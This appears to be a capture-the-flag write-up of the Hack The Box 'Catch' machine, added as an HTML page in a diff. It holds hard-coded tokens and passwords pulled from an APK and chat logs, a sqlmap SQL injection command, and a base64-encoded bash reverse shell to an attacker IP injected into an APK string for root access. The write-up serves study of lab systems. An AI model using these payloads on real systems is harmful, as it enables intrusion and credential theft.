@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <link rel="stylesheet" href="/style.css">
+    <meta charset="utf-8">
+    <title>HTB Catch</title>
+  </head>
+  <body>
+    HTB Catch
+    <h2 id="osint">osint</h2>
+
+<p>Starting with an Nmap scan revealed a number of services running on the target.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+3000/tcp open  ppp?    syn-ack
+5000/tcp open  upnp?   syn-ack
+</code></pre></div></div>
+
+<p>Interestingly, there were two different Apache services, both on different versions, as well as another two ports that were not identified.</p>
+
+<p>Cookies fetched by an Nmap script showed that there was a Gitea server running on port 3000. But the other ports were still unknown.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Cookie: i_like_gitea=a9634c3d8acdc09d; Path=/; HttpOnly
+</code></pre></div></div>
+
+<p>Opening each of the pages in a web browser helped to identify these other services.</p>
+
+<p>The main page on port 80 was a simple landing page for ‘Catch Global Systems’, allowing the user to download an APK file. This would have to be further investigated.</p>
+
+<p>Port 3000 was running Gitea version 1.14.1 with Go 1.16.3 and port 5000 was running <a href="https://github.com/sdelements/lets-chat">Let’s Chat</a>. Both of these were locked with passwords and default credentials did not work.</p>
+
+<p>The last page of interest was a monitoring dashboard running on port 8000 which appeared to be based on Cachet 2.4. Some background research found a few different CVEs which could be useful however they all required an authenticated user and would not be useable at this point.</p>
+
+<h2 id="reverse-engineering">reverse-engineering</h2>
+
+<p>Going back to the APK that was found, Apktool can be used to decompile the binary so that the source code can be browsed in another application such as VSCode.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apktool d ./catchv1.0.apk
+</code></pre></div></div>
+
+<p>According to the landing page that was found earlier, “The future enhancements [include] Lets-chat/Gitea integration”, hinting that there could be API keys or hard-coded credentials in the application to integrate these services.</p>
+
+<p>Tokens Found</p>
+
+<p>original/res/values/strings.xml</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;string name="gitea_token"&gt;b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0&lt;/string&gt;
+
+&lt;string name="lets_chat_token"&gt;NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&lt;/string&gt;
+
+&lt;string name="slack_token"&gt;xoxp-23984754863-2348975623103&lt;/string&gt;
+</code></pre></div></div>
+
+<p>Use Let’s Chat API Token to read channels and messages</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="s2">"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="</span> <span class="nt">-i</span>   http://10.10.11.150:5000/rooms
+curl <span class="nt">-H</span> <span class="s2">"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="</span> <span class="nt">-i</span>   http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[{</span><span class="s2">"id"</span>:<span class="s2">"61b86b28d984e2451036eb17"</span>,<span class="s2">"slug"</span>:<span class="s2">"status"</span>,<span class="s2">"name"</span>:<span class="s2">"Status"</span>,<span class="s2">"description"</span>:<span class="s2">"Cachet Updates and Maintenance"</span>,<span class="s2">"lastActive"</span>:<span class="s2">"2021-12-14T10:34:20.749Z"</span>,<span class="s2">"created"</span>:<span class="s2">"2021-12-14T10:00:08.384Z"</span>,<span class="s2">"owner"</span>:<span class="s2">"61b86aead984e2451036eb16"</span>,<span class="s2">"private"</span>:false,<span class="s2">"hasPassword"</span>:false,<span class="s2">"participants"</span>:[]<span class="o">}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b8708efe190b466d476bfb"</span>,<span class="s2">"slug"</span>:<span class="s2">"android_dev"</span>,<span class="s2">"name"</span>:<span class="s2">"Android Development"</span>,<span class="s2">"description"</span>:<span class="s2">"Android App Updates, Issues &amp; More"</span>,<span class="s2">"lastActive"</span>:<span class="s2">"2021-12-14T10:24:21.145Z"</span>,<span class="s2">"created"</span>:<span class="s2">"2021-12-14T10:23:10.474Z"</span>,<span class="s2">"owner"</span>:<span class="s2">"61b86aead984e2451036eb16"</span>,<span class="s2">"private"</span>:false,<span class="s2">"hasPassword"</span>:false,<span class="s2">"participants"</span>:[]<span class="o">}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b86b3fd984e2451036eb18"</span>,<span class="s2">"slug"</span>:<span class="s2">"employees"</span>,<span class="s2">"name"</span>:<span class="s2">"Employees"</span>,<span class="s2">"description"</span>:<span class="s2">"New Joinees, Org updates"</span>,<span class="s2">"lastActive"</span>:<span class="s2">"2021-12-14T10:18:04.710Z"</span>,<span class="s2">"created"</span>:<span class="s2">"2021-12-14T10:00:31.043Z"</span>,<span class="s2">"owner"</span>:<span class="s2">"61b86aead984e2451036eb16"</span>,<span class="s2">"private"</span>:false,<span class="s2">"hasPassword"</span>:false,<span class="s2">"participants"</span>:[]<span class="o">}]</span>
+<span class="o">[{</span><span class="s2">"id"</span>:<span class="s2">"61b8732cfe190b466d476c02"</span>,<span class="s2">"text"</span>:<span class="s2">"ah sure!"</span>,<span class="s2">"posted"</span>:<span class="s2">"2021-12-14T10:34:20.749Z"</span>,<span class="s2">"owner"</span>:<span class="s2">"61b86dbdfe190b466d476bf0"</span>,<span class="s2">"room"</span>:<span class="s2">"61b86b28d984e2451036eb17"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b8731ffe190b466d476c01"</span>,<span class="s2">"text"</span>:<span class="s2">"You should actually include this task to your list as well as a part of quarterly audit"</span>,<span class="s2">"posted"</span>:<span class="s2">"2021-12-14T10:34:07.449Z"</span>,<span class="s2">"owner"</span>:<span class="s2">"61b86aead984e2451036eb16"</span>,<span class="s2">"room"</span>:<span class="s2">"61b86b28d984e2451036eb17"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b872b9fe190b466d476c00"</span>,<span class="s2">"text"</span>:<span class="s2">"Also make sure we've our systems, applications and databases up-to-date."</span>,<span class="s2">"posted"</span>:<span class="s2">"2021-12-14T10:32:25.514Z"</span>,<span class="s2">"owner"</span>:<span class="s2">"61b86dbdfe190b466d476bf0"</span>,<span class="s2">"room"</span>:<span class="s2">"61b86b28d984e2451036eb17"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b87282fe190b466d476bff"</span>,<span class="s2">"text"</span>:<span class="s2">"Excellent! "</span>,<span class="s2">"posted"</span>:<span class="s2">"2021-12-14T10:31:30.403Z"</span>,<span class="s2">"owner"</span>:<span class="s2">"61b86aead984e2451036eb16"</span>,<span class="s2">"room"</span>:<span class="s2">"61b86b28d984e2451036eb17"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b87277fe190b466d476bfe"</span>,<span class="s2">"text"</span>:<span class="s2">"Why not. We've this in our todo list for next quarter"</span>,<span class="s2">"posted"</span>:<span class="s2">"2021-12-14T10:31:19.094Z"</span>,<span class="s2">"owner"</span>:<span class="s2">"61b86dbdfe190b466d476bf0"</span>,<span class="s2">"room"</span>:<span class="s2">"61b86b28d984e2451036eb17"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b87241fe190b466d476bfd"</span>,<span class="s2">"text"</span>:<span class="s2">"@john is it possible to add SSL to our status domain to make sure everything is secure ? "</span>,<span class="s2">"posted"</span>:<span class="s2">"2021-12-14T10:30:25.108Z"</span>,<span class="s2">"owner"</span>:<span class="s2">"61b86aead984e2451036eb16"</span>,<span class="s2">"room"</span>:<span class="s2">"61b86b28d984e2451036eb17"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b8702dfe190b466d476bfa"</span>,<span class="s2">"text"</span>:<span class="s2">"Here are the credentials </span><span class="sb">`</span>john :  E<span class="o">}</span>V!mywu_69T4C<span class="o">}</span>W<span class="sb">`</span><span class="s2">"</span>,<span class="s2">"posted"</span>:<span class="s2">"2021-12-14T10:21:33.859Z"</span>,<span class="s2">"owner"</span>:<span class="s2">"61b86f15fe190b466d476bf5"</span>,<span class="s2">"room"</span>:<span class="s2">"61b86b28d984e2451036eb17"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b87010fe190b466d476bf9"</span>,<span class="s2">"text"</span>:<span class="s2">"Sure one sec."</span>,<span class="s2">"posted"</span>:<span class="s2">"2021-12-14T10:21:04.635Z"</span>,<span class="s2">"owner"</span>:<span class="s2">"61b86f15fe190b466d476bf5"</span>,<span class="s2">"room"</span>:<span class="s2">"61b86b28d984e2451036eb17"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b86fb1fe190b466d476bf8"</span>,<span class="s2">"text"</span>:<span class="s2">"Can you create an account for me ? "</span>,<span class="s2">"posted"</span>:<span class="s2">"2021-12-14T10:19:29.677Z"</span>,<span class="s2">"owner"</span>:<span class="s2">"61b86dbdfe190b466d476bf0"</span>,<span class="s2">"room"</span>:<span class="s2">"61b86b28d984e2451036eb17"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b86f4dfe190b466d476bf6"</span>,<span class="s2">"text"</span>:<span class="s2">"Hey Team! I'll be handling the </span><span class="sb">`</span>status.catch.htb<span class="sb">`</span><span class="s2"> from now on. Lemme know if you need anything from me. "</span>,<span class="s2">"posted"</span>:<span class="s2">"2021-12-14T10:17:49.761Z"</span>,<span class="s2">"owner"</span>:<span class="s2">"61b86f15fe190b466d476bf5"</span>,<span class="s2">"room"</span>:<span class="s2">"61b86b28d984e2451036eb17"</span><span class="o">}]</span>
+</code></pre></div></div>
+
+<p>And grab list of users</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[{</span><span class="s2">"id"</span>:<span class="s2">"61b86aead984e2451036eb16"</span>,<span class="s2">"firstName"</span>:<span class="s2">"Administrator"</span>,<span class="s2">"lastName"</span>:<span class="s2">"NA"</span>,<span class="s2">"username"</span>:<span class="s2">"admin"</span>,<span class="s2">"displayName"</span>:<span class="s2">"Admin"</span>,<span class="s2">"avatar"</span>:<span class="s2">"e2b5310ec47bba317c5f1b5889e96f04"</span>,<span class="s2">"openRooms"</span>:[<span class="s2">"61b86b28d984e2451036eb17"</span>,<span class="s2">"61b86b3fd984e2451036eb18"</span>,<span class="s2">"61b8708efe190b466d476bfb"</span><span class="o">]}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b86dbdfe190b466d476bf0"</span>,<span class="s2">"firstName"</span>:<span class="s2">"John"</span>,<span class="s2">"lastName"</span>:<span class="s2">"Smith"</span>,<span class="s2">"username"</span>:<span class="s2">"john"</span>,<span class="s2">"displayName"</span>:<span class="s2">"John"</span>,<span class="s2">"avatar"</span>:<span class="s2">"f5504305b704452bba9c94e228f271c4"</span>,<span class="s2">"openRooms"</span>:[<span class="s2">"61b86b3fd984e2451036eb18"</span>,<span class="s2">"61b86b28d984e2451036eb17"</span><span class="o">]}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b86e40fe190b466d476bf2"</span>,<span class="s2">"firstName"</span>:<span class="s2">"Will"</span>,<span class="s2">"lastName"</span>:<span class="s2">"Robinson"</span>,<span class="s2">"username"</span>:<span class="s2">"will"</span>,<span class="s2">"displayName"</span>:<span class="s2">"Will"</span>,<span class="s2">"avatar"</span>:<span class="s2">"7c6143461e935a67981cc292e53c58fc"</span>,<span class="s2">"openRooms"</span>:[<span class="s2">"61b86b3fd984e2451036eb18"</span>,<span class="s2">"61b86b28d984e2451036eb17"</span><span class="o">]}</span>,<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"61b86f15fe190b466d476bf5"</span>,<span class="s2">"firstName"</span>:<span class="s2">"Lucas"</span>,<span class="s2">"lastName"</span>:<span class="s2">"NA"</span>,<span class="s2">"username"</span>:<span class="s2">"lucas"</span>,<span class="s2">"displayName"</span>:<span class="s2">"Lucas"</span>,<span class="s2">"avatar"</span>:<span class="s2">"b36396794553376673623dc0f6dec9bb"</span>,<span class="s2">"openRooms"</span>:[<span class="s2">"61b86b28d984e2451036eb17"</span>,<span class="s2">"61b86b3fd984e2451036eb18"</span><span class="o">]}]</span>
+</code></pre></div></div>
+
+<p>Found credentials for the status domain</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"Here are the credentials </span><span class="sb">`</span>john :  E<span class="o">}</span>V!mywu_69T4C<span class="o">}</span>W<span class="sb">`</span><span class="s2">"</span>
+</code></pre></div></div>
+
+<p>Use SQL Injection with sqlmap to dump api keys</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"http://status.catch.htb:8000/api/v1/components?name=1&amp;1[0]=&amp;1[1]=a&amp;1[2]=&amp;1[3]=or+%27a%27=%3F%20and%201=1)*+--+"</span> <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-D</span> cachet <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">-C</span> api_key,username <span class="nt">--dump</span>
+
++----------------------+----------+
+| api_key              | username |
++----------------------+----------+
+| 7GVCqTY5abrox48Nct8j | john     |
+| rMSN8kJN9TPADl2cWv8N | admin    |
++----------------------+----------+
+</code></pre></div></div>
+
+<p><a href="https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/">https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/</a></p>
+
+<p>Configuration Injection in Settings &gt; Mail &gt; ‘Mail From Address’</p>
+
+<p>${DB_USERNAME} = will</p>
+
+<p>${DB_PASSWORD} = s2#4Fg0_%3!</p>
+
+<p>SSH as will</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User Flag: 794e64d1eb9b77178f53792d5a0b60e8
+</code></pre></div></div>
+
+<p>Modify and recompile APK file with reverse shell shellcode</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Strings.xml
+&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"app_name"</span><span class="o">&gt;</span>Catch<span class="p">;</span> <span class="nb">echo </span>L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuOTgvOTAwMSAwPCYxIDI+JjEK | <span class="nb">base64</span> <span class="nt">-d</span> | bash <span class="nt">-i</span>&lt;/string&gt;
+</code></pre></div></div>
+
+<p>Upload to server which will run it as a cronjob and give privilege escalation</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 9001
+scp out.apk will@10.10.11.150:/opt/mdm/apk_bin/
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on <span class="o">[</span>any] 9001 ...
+connect to <span class="o">[</span>10.10.14.98] from status.catch.htb <span class="o">[</span>10.10.11.150] 36122
+
+<span class="o">&gt;</span> <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="o">&gt;</span> <span class="nb">ls
+</span>Catch
+lets-chat
+mdm
+reset.sh
+root.txt
+run.sh
+</code></pre></div></div>
+
+  </body>
+</html>
